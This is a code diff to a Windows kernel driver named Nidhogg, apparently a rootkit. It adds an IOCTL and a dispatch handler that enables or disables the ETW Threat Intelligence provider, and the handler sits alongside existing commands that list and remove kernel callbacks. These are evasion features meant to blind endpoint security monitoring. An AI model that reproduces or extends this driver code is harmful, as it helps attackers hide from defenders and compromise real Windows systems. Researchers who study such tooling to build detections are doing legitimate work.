@@ -37,6 +37,7 @@
 #define IOCTL_NIDHOGG_LIST_REGCALLBACKS CTL_CODE(0x8000, 0x81C, METHOD_BUFFERED, FILE_ANY_ACCESS)
 #define IOCTL_NIDHOGG_REMOVE_CALLBACK CTL_CODE(0x8000, 0x81D, METHOD_BUFFERED, FILE_ANY_ACCESS)
 #define IOCTL_NIDHOGG_RESTORE_CALLBACK CTL_CODE(0x8000, 0x81E, METHOD_BUFFERED, FILE_ANY_ACCESS)
+#define IOCTL_NIDHOGG_ENABLE_DISABLE_ETWTI CTL_CODE(0x8000, 0x81F, METHOD_BUFFERED, FILE_ANY_ACCESS)
 // *******************************************************************************************************
 
 /*
@@ -1270,6 +1271,37 @@ NTSTATUS NidhoggDeviceControl(PDEVICE_OBJECT, PIRP Irp) {
 			KdPrint((DRIVER_PREFIX "Failed to restore callback (0x%08X)\n", status));
 
 		len += sizeof(KernelCallback);
+		break;
+	}
+
+	case IOCTL_NIDHOGG_ENABLE_DISABLE_ETWTI:
+	{
+		if (!Features.EtwTiTamper) {
+			KdPrint((DRIVER_PREFIX "Due to previous error, etwti tampering is unavaliable.\n"));
+			status = STATUS_UNSUCCESSFUL;
+			break;
+		}
+
+		auto size = stack->Parameters.DeviceIoControl.InputBufferLength;
+
+		if (size % sizeof(ULONG) != 0) {
+			status = STATUS_INVALID_BUFFER_SIZE;
+			break;
+		}
+
+		auto data = (ULONG*)Irp->AssociatedIrp.SystemBuffer;
+
+		if (*data != true && *data != false) {
+			status = STATUS_INVALID_PARAMETER;
+			break;
+		}
+
+		status = EnableDisableEtwTI(*data);
+
+		if (!NT_SUCCESS(status))
+			KdPrint((DRIVER_PREFIX "Failed to tamper ETWTI (0x%08X)\n", status));
+
+		len += sizeof(ULONG);
 		break;
 	}
 
